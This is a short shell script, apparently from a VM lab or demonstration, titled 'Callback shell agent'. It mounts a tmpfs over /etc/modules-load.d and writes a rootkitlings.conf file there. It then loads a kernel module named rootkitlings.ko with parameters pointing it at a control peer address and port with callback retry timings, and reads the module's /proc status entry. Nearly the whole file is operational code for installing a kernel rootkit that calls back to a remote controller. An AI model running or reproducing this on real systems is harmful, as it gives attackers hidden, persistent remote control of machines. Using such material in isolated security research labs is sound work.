#!/bin/sh

set -eu

# shellcheck source=scripts/lib/ui.sh
. /vm/ui.sh

peer=${1:-}
control_port=${2:-}

show()
{
	ui_transcript "$*"
}

run()
{
	show "$@"
	"$@"
}

ui_heading 'Callback shell agent'
ui_field 'Control peer' "$peer:$control_port"

run mkdir -p /etc/modules-load.d
run mount -t tmpfs -o nosuid,nodev,noexec,mode=0700 tmpfs \
	/etc/modules-load.d
run chmod 0700 /etc/modules-load.d
show "printf 'original-request\\n' > /etc/modules-load.d/rootkitlings.conf"
printf 'original-request\n' > /etc/modules-load.d/rootkitlings.conf
run chmod 0600 /etc/modules-load.d/rootkitlings.conf
command='insmod /rootkitlings/rootkitlings.ko'
command="$command peer_address=$peer peer_port=$control_port"
command="$command retry_base_ms=25 retry_max_ms=200"
show "$command"
insmod /rootkitlings/rootkitlings.ko \
	"peer_address=$peer" \
	"peer_port=$control_port" \
	retry_base_ms=25 \
	retry_max_ms=200
run cat /proc/rootkitlings_agent
